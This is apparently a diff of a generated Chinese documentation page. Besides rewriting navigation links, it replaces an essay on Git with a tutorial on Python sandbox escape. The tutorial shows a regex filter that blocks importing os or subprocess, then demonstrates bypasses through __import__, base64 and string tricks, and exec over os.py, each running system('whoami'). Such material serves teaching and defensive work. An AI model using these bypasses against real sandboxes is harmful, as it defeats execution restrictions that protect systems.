-      <a href="../../../%E7%BC%96%E7%A0%81/Python/NumPy/04_%E4%BB%8E%E7%8E%B0%E6%9C%89%E6%95%B0%E6%8D%AE%E5%88%9B%E5%BB%BANumpy%E6%95%B0%E7%BB%84/" class="md-nav__link">
+      <a href="../../NumPy/04_%E4%BB%8E%E7%8E%B0%E6%9C%89%E6%95%B0%E6%8D%AE%E5%88%9B%E5%BB%BANumpy%E6%95%B0%E7%BB%84/" class="md-nav__link">
         04 从现有数据创建Numpy数组
       </a>
     </li>
@@ -1739,7 +1551,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/00_PyTorch%E7%AE%80%E4%BB%8B/" class="md-nav__link">
+      <a href="../../PyTorch/00_PyTorch%E7%AE%80%E4%BB%8B/" class="md-nav__link">
         00 PyTorch简介
       </a>
     </li>
@@ -1753,7 +1565,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/01_%E5%88%9D%E8%AF%86PyTorch/" class="md-nav__link">
+      <a href="../../PyTorch/01_%E5%88%9D%E8%AF%86PyTorch/" class="md-nav__link">
         01 初识PyTorch
       </a>
     </li>
@@ -1767,7 +1579,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/02_PyTorch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" class="md-nav__link">
+      <a href="../../PyTorch/02_PyTorch%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/" class="md-nav__link">
         02 PyTorch安装教程
       </a>
     </li>
@@ -1781,7 +1593,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/03_PyTorch%E5%8C%85/" class="md-nav__link">
+      <a href="../../PyTorch/03_PyTorch%E5%8C%85/" class="md-nav__link">
         03 PyTorch包
       </a>
     </li>
@@ -1795,7 +1607,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/04_PyTorch%E4%B8%AD%E7%9A%84torch.nn%E6%A8%A1%E5%9D%97/" class="md-nav__link">
+      <a href="../../PyTorch/04_PyTorch%E4%B8%AD%E7%9A%84torch.nn%E6%A8%A1%E5%9D%97/" class="md-nav__link">
         04 PyTorch中的torch.nn模块
       </a>
     </li>
@@ -1809,7 +1621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/05_PyTorch%E5%9F%BA%E7%A1%80/" class="md-nav__link">
+      <a href="../../PyTorch/05_PyTorch%E5%9F%BA%E7%A1%80/" class="md-nav__link">
         05 PyTorch基础
       </a>
     </li>
@@ -1823,7 +1635,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/06_%E5%BC%A0%E9%87%8F/" class="md-nav__link">
+      <a href="../../PyTorch/06_%E5%BC%A0%E9%87%8F/" class="md-nav__link">
         06 张量
       </a>
     </li>
@@ -1837,7 +1649,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/07_%E4%B8%80%E7%BB%B4%E5%BC%A0%E9%87%8F/" class="md-nav__link">
+      <a href="../../PyTorch/07_%E4%B8%80%E7%BB%B4%E5%BC%A0%E9%87%8F/" class="md-nav__link">
         07 一维张量
       </a>
     </li>
@@ -1851,7 +1663,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/08_%E5%90%91%E9%87%8F%E6%93%8D%E4%BD%9C/" class="md-nav__link">
+      <a href="../../PyTorch/08_%E5%90%91%E9%87%8F%E6%93%8D%E4%BD%9C/" class="md-nav__link">
         08 向量操作
       </a>
     </li>
@@ -1865,7 +1677,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/09_%E4%BA%8C%E7%BB%B4%E5%BC%A0%E9%87%8F/" class="md-nav__link">
+      <a href="../../PyTorch/09_%E4%BA%8C%E7%BB%B4%E5%BC%A0%E9%87%8F/" class="md-nav__link">
         09 二维张量
       </a>
     </li>
@@ -1879,7 +1691,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/10_PyTorch%E4%B8%AD%E7%9A%84%E6%A2%AF%E5%BA%A6/" class="md-nav__link">
+      <a href="../../PyTorch/10_PyTorch%E4%B8%AD%E7%9A%84%E6%A2%AF%E5%BA%A6/" class="md-nav__link">
         10 PyTorch中的梯度
       </a>
     </li>
@@ -1893,7 +1705,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/PyTorch/11_%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/" class="md-nav__link">
+      <a href="../../PyTorch/11_%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/" class="md-nav__link">
         11 线性回归
       </a>
     </li>
@@ -1912,14 +1724,16 @@
               
   
   
+    
+  
   
     
-    <li class="md-nav__item md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
       
       
       
       
-      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_5" >
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9_2_5" checked>
       
       
       
@@ -1928,7 +1742,7 @@
           <span class="md-nav__icon md-icon"></span>
         </label>
       
-      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_9_2_5_label" aria-expanded="false">
+      <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_9_2_5_label" aria-expanded="true">
         <label class="md-nav__title" for="__nav_9_2_5">
           <span class="md-nav__icon md-icon"></span>
           Python沙箱逃逸
@@ -1941,7 +1755,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/01_%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0/" class="md-nav__link">
+      <a href="../01_%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0/" class="md-nav__link">
         01 沙箱逃逸概述
       </a>
     </li>
@@ -1953,11 +1767,61 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/02_%E5%87%BD%E6%95%B0%E5%AF%BC%E5%85%A5%E9%99%90%E5%88%B6%E5%92%8C%E7%BB%95%E8%BF%87/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          02 函数导入限制和绕过
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         02 函数导入限制和绕过
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    函数导入限制和绕过
+  </a>
+  
+    <nav class="md-nav" aria-label="函数导入限制和绕过">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#import" class="md-nav__link">
+    import
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2003,7 +1867,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../%E7%BC%96%E7%A0%81/Python/%E5%A4%8D%E4%B9%A0/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%94%A8%E4%BE%8B/" class="md-nav__link">
+      <a href="../../%E5%A4%8D%E4%B9%A0/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E7%94%A8%E4%BE%8B/" class="md-nav__link">
         基础语法用例
       </a>
     </li>
@@ -2056,154 +1920,16 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#git" class="md-nav__link">
-    为什么强烈建议使用 Git
-  </a>
-  
-    <nav class="md-nav" aria-label="为什么强烈建议使用 Git">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    分布式的自由
+    函数导入限制和绕过
   </a>
   
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    强大的分支模型
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_3" class="md-nav__link">
-    协作与社区
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    安全性与完整性
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_5" class="md-nav__link">
-    易于备份和恢复
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_6" class="md-nav__link">
-    经历考验的稳定性
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_7" class="md-nav__link">
-    生态系统和工具
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_8" class="md-nav__link">
-    结论
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#git_1" class="md-nav__link">
-    Git 对于个人和团队项目的价值
-  </a>
-  
-    <nav class="md-nav" aria-label="Git 对于个人和团队项目的价值">
+    <nav class="md-nav" aria-label="函数导入限制和绕过">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#_9" class="md-nav__link">
-    个人项目的增强
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_10" class="md-nav__link">
-    团队协作的促进
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_11" class="md-nav__link">
-    跨部门和跨地域的协作
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_12" class="md-nav__link">
-    结论
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_13" class="md-nav__link">
-    鼓励读者继续学习和实践
-  </a>
-  
-    <nav class="md-nav" aria-label="鼓励读者继续学习和实践">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_14" class="md-nav__link">
-    拥抱持续学习的心态
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_15" class="md-nav__link">
-    结合实践巩固知识
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_16" class="md-nav__link">
-    利用在线资源和工具
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_17" class="md-nav__link">
-    分享你的学习成果
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_18" class="md-nav__link">
-    结论
+  <a href="#import" class="md-nav__link">
+    import
   </a>
   
 </li>
@@ -2231,83 +1957,90 @@
   
 
 
-  <h1>08 为什么强烈建议学会使用Git</h1>
+  <h1>02 函数导入限制和绕过</h1>
 
-<h2 id="git">为什么强烈建议使用 Git<a class="headerlink" href="#git" title="Permanent link">&para;</a></h2>
-<p>在编程世界的史诗故事中，Git 不仅仅是一个版本控制系统，它是一种文化，一种协作方式，一种让你的代码历史变得强大的魔法。以下是为什么我们强烈建议使用 Git 的几个原因：</p>
-<h3 id="_1">分布式的自由<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
-<p>Git 是一个分布式版本控制系统，这意味着每个巫师（开发者）都有自己的魔法书（代码库副本）。你可以在本地进行魔法实验（修改代码），不受网络连接的束缚，并且每个副本都保留了完整的历史和功能。</p>
-<h3 id="_2">强大的分支模型<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<p>Git 的分支是轻量级的，这使得分支和合并变得异常快速和简单。巫师们可以自由地在不同的实验分支上工作，合并时也能保持历史记录的清洁和直观。</p>
-<h3 id="_3">协作与社区<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<p>Git 支持所有规模的协作。无论是小团队的紧密合作，还是开源项目中成千上万的贡献者，Git 的工作流程都能够适应并促进有效的团队工作。</p>
-<h3 id="_4">安全性与完整性<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
-<p>Git 设计了强大的内容完整性机制。每次提交都通过 SHA-1 哈希进行标记，以确保代码的完整性和不可变性。这意味着你的魔法书（代码库）不会轻易被破坏。</p>
-<h3 id="_5">易于备份和恢复<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
-<p>由于每个副本都包含了完整的历史，备份和恢复变得非常简单。即使远程服务器发生故障，任何一个本地副本都可以用来恢复整个项目。</p>
-<h3 id="_6">经历考验的稳定性<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
-<p>Git 已经在全球范围内被无数项目所使用和考验，从小型个人项目到大型企业级应用。它的性能、灵活性和稳定性已经得到了验证。</p>
-<h3 id="_7">生态系统和工具<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
-<p>Git 拥有一个庞大的生态系统，包括图形界面客户端、在线托管平台（如 GitHub、GitLab 和 Bitbucket）以及各种开发、持续集成和部署工具。这些工具和服务为 Git 的使用提供了极大的方便和强大的功能。</p>
-<h3 id="_8">结论<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
-<p>Git 已经成为现代软件开发的标准工具，无论你是独立开发者还是大型企业的一员，都能从其提供的功能中受益。Git 的设计哲学、生态系统和社区支持确保了它可以满足各种工作流程和项目需求。因此，我们强烈建议使用 Git 作为你的版本控制系统，让它成为你编程旅程中的强大伙伴。</p>
-<h2 id="git_1">Git 对于个人和团队项目的价值<a class="headerlink" href="#git_1" title="Permanent link">&para;</a></h2>
-<p>Git 不仅仅是一个版本控制工具，它是一个能够极大提升个人和团队生产力的系统。对于软件开发的各个方面，从个人的小型项目到大型团队协作，Git 提供了一系列的价值。</p>
-<h3 id="_9">个人项目的增强<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
-<p>即使是独自工作的巫师（开发者），也会从 Git 中获得显著的好处：</p>
-<ul>
-<li><strong>代码历史的追踪</strong>：Git 提供了一个详细的代码变更历史，使得理解和回顾自己的代码成为可能。</li>
-<li><strong>实验自由</strong>：能够在分支上自由地尝试新的想法，而不影响主线的稳定性。</li>
-<li><strong>代码备份</strong>：将代码推送到远程仓库，例如 GitHub，可以作为备份，并在需要时从任何地方访问你的代码。</li>
-<li><strong>学习和成长</strong>：Git 是业界标准，通过学习和使用它，你可以提高你的技能和市场价值。</li>
-</ul>
-<h3 id="_10">团队协作的促进<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
-<p>团队项目中，Git 的价值更是显著：</p>
-<ul>
-<li><strong>并行开发</strong>：多个巫师可以同时在不同的分支上工作，提高团队的效率。</li>
-<li><strong>冲突解决</strong>：Git 提供了强大的工具来处理和解决代码冲突，保证团队成员的更改可以和谐地融合。</li>
-<li><strong>代码审查</strong>：利用拉取请求（Pull Request）进行代码审查，可以提前发现问题并提高代码质量。</li>
-<li><strong>持续集成/持续部署（CI/CD）</strong>：与各种现代的开发工具集成，如自动化测试、自动部署等，实现敏捷开发和DevOps。</li>
-</ul>
-<h3 id="_11">跨部门和跨地域的协作<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
-<p>对于大型组织和分布在不同地域的团队，Git 也提供了无可替代的价值：</p>
-<ul>
-<li><strong>版本控制的标准化</strong>：Git 作为业界标准，有助于跨团队和跨部门的统一协作。</li>
-<li><strong>远程工作的支持</strong>：Git 的分布式特性使得远程工作成为可能，团队成员可以在任何地方进行有效的协作。</li>
-<li><strong>知识共享</strong>：代码库可以作为知识库，新团队成员可以通过查看代码历史来快速上手和理解项目。</li>
-</ul>
-<h3 id="_12">结论<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
-<p>无论是个人还是团队，Git 都提供了强大的功能来支持软件开发的各个方面。从提升个人的编程技术，到促进团队成员之间的协作，甚至是支持跨地域的大规模项目，Git 都是提高效率、保证代码质量、实现项目管理最佳实践的重要工具。因此，无论你的项目大小，从事个人开发还是团队协作，Git 都是一个宝贵的资源，能够帮助你实现编程目标。</p>
-<h2 id="_13">鼓励读者继续学习和实践<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
-<p>在编程旅程的奇幻世界中，学习和实践是每位巫师成长的不二法门。Git，作为一门强大的魔法，不仅仅是掌握它的技能，更是持续探索和精进的过程。因此，我们鼓励所有读者不断学习和实践，使自己在编程的道路上越走越远。</p>
-<h3 id="_14">拥抱持续学习的心态<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
-<p>技术世界在不断变化，新的魔法（技术）和咒语（工具）层出不穷。保持一颗开放和好奇的心，不断寻找新知识和技能，将使你在变幻莫测的世界中立于不败之地。</p>
-<ul>
-<li><strong>订阅技术博客</strong>：关注行业领先的博客和技术公众号，获取最新的编程资讯和技术动态。</li>
-<li><strong>加入开源社区</strong>：参与开源项目，与全球的开发者交流和协作，共同解决问题。</li>
-<li><strong>参加技术会议和研讨会</strong>：这些活动是学习新技术、网络和分享经验的绝佳场所。</li>
-</ul>
-<h3 id="_15">结合实践巩固知识<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
-<p>阅读和学习是学习的第一步，将所学知识付诸实践才能真正掌握。通过项目练习或日常工作，实际运用 Git，你将更深刻地理解其原理和技巧。</p>
-<ul>
-<li><strong>创建个人项目</strong>：利用 Git 管理自己的代码，即使是小型或个人的项目。</li>
-<li><strong>模拟团队协作</strong>：与朋友或同事一起通过 Git 协作，模拟真实的团队工作流程。</li>
-<li><strong>解决实际问题</strong>：在实际编程中遇到问题时，尝试使用 Git 的特性来解决。</li>
-</ul>
-<h3 id="_16">利用在线资源和工具<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
-<p>网络上有丰富的资源可以帮助你学习 Git，从交互式教程到全面的课程，利用这些资源可以让你的学习之路更加多彩。</p>
-<ul>
-<li><strong>在线教程和课程</strong>：通过完成课程和教程，系统地学习 Git 的各个方面。</li>
-<li><strong>视频和直播课程</strong>：观看专家的视频教学，可以提供不同的视角和解释。</li>
-</ul>
-<h3 id="_17">分享你的学习成果<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
-<p>学习的一个重要方面是分享。通过写博客、发推文或在社区中分享，你可以帮助他人学习，同时加深自己的理解。</p>
-<ul>
-<li><strong>写博客</strong>：分享你关于 Git 的学习心得、技巧或教程。</li>
-<li><strong>参与问答社区</strong>：在 Stack Overflow 等平台上回答相关问题，帮助需要帮助的人。</li>
-</ul>
-<h3 id="_18">结论<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
-<p>无论你是 Git 的新手，还是经验丰富的使用者，都有无限的学习空间。通过不断的学习和实践，积极参与社区和分享知识，你将在编程的道路上取得更大的进步和成功。让我们一起持续学习，一起成长，将我们的编程艺术推向新的高度。</p>
+<h2 id="_1">函数导入限制和绕过<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="import">import<a class="headerlink" href="#import" title="Permanent link">&para;</a></h3>
+<p>一个受限制的环境，禁止导入敏感的包是最常见的方法，所以import一般是最容易被限制掉。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span><span class="nn">sys</span>
+
+<span class="n">pattern</span>  <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;import\s+(os|subprocess)&#39;</span><span class="p">)</span>
+<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;forbidden module import detected&quot;</span><span class="p">)</span>
+    <span class="k">raise</span> <span class="ne">Exception</span>
+</code></pre></div>
+<p>这种简单的限制不能导入包的形式，可以中间添加空格来绕过，或者使用其他方式导入包，比如</p>
+<p><div class="highlight"><pre><span></span><code><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="nb">__import__</span>
+<span class="n">importlib</span>
+</code></pre></div></p>
+<p>还可以使用编码的方式绕过对导入包关键字的检查，比如使用base64，python2中适用
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s2">&quot;os&quot;</span><span class="p">)</span>
+<span class="s1">&#39;b3M=&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">__import__</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;b3M=&#39;</span><span class="p">))</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">flag</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">misaki</span>\<span class="n">user</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">importlib</span>
+
+<span class="o">&gt;&gt;&gt;</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">importlib</span><span class="o">.</span><span class="n">import_module</span><span class="p">(</span><span class="s1">&#39;b3M=&#39;</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">))</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">flag</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+
+<span class="n">misaki</span>\<span class="n">user</span>
+</code></pre></div>
+<img alt="01_02-01" src="../../../../image/%E7%BC%96%E7%A0%81/Python/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/01_02-01.png" /></p>
+<p>或者使用字符串拼接的方式
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;who&#39;</span><span class="o">+</span><span class="s1">&#39;ami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+<span class="mi">0</span>
+</code></pre></div></p>
+<p>字符串f翻转截取
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;so&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+<span class="mi">0</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="s1">&#39;)&quot;imaohw&quot;(metsys.so ;so tropmi&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">aiuser</span>
+</code></pre></div></p>
+<p>再万一，还可以这么禁止
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span><span class="nn">sys</span>
+
+<span class="n">pattern</span>  <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;import&#39;</span><span class="p">)</span>
+<span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span><span class="n">sys</span><span class="o">.</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+<span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;forbidden module import detected&quot;</span><span class="p">)</span>
+    <span class="k">raise</span> <span class="ne">Exception</span>
+</code></pre></div></p>
+<p>这样的话，不管怎么换导入函数都会被禁止。那么是否有不直接使用import关键字来导入的方式。既然需要导入也就是只需要能执行对应的库就可以。</p>
+<p>使用execfile，不过在这之前需要判断得到库的物理路径。如果sys模块没被禁用的话，就可以使用sys来获取物理路径。这种方式只能用在python2中，python3取消了execfile
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">execfile</span><span class="p">(</span><span class="s1">&#39;/usr/lib/python2.7/os.py&#39;</span><span class="p">)</span>  <span class="c1">#Linux系统下默认路径</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+</code></pre></div></p>
+<p>python3可以利用读取文件，配合exec来执行
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;/usr/lib/python3.6/os.py&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+
+<span class="c1"># 不可以执行利用 exec 打开读取，exec 需要执行的是其中的内容，直接打开的时候 exec 执行的就是读取文件操作</span>
+<span class="n">exec</span><span class="p">(</span><span class="s2">&quot;open(&#39;/usr/lib/python3.6/os.py&#39;,&#39;r&#39;).read()&quot;</span><span class="p">)</span>
+</code></pre></div></p>
+<p>使用with open的形式
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;/usr/lib/python3.6/os.py&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="o">...</span>     <span class="n">exec</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+<span class="o">...</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+</code></pre></div></p>
+<p>或者使用字符串拼接的方式，但是需要跟exec，eval一起利用。
+<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;&gt;</span> <span class="n">exec</span><span class="p">(</span><span class="s1">&#39;imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort&#39;</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="s1">&#39;os;&#39;</span><span class="o">+</span><span class="s1">&#39;os.system(&quot;whoami&quot;)&#39;</span><span class="p">)</span>
+<span class="n">aiuser</span>
+</code></pre></div>
+这里 exec 不需要导入就可以直接引用，当然不需要导入就可以引用的函数不止这一个，因为一个内建函数的原因。</p>
 
 
 
@@ -2345,10 +2078,10 @@
       <div class="md-dialog__inner md-typeset"></div>
     </div>
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.sections"], "search": "../../../assets/javascripts/workers/search.208ed371.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
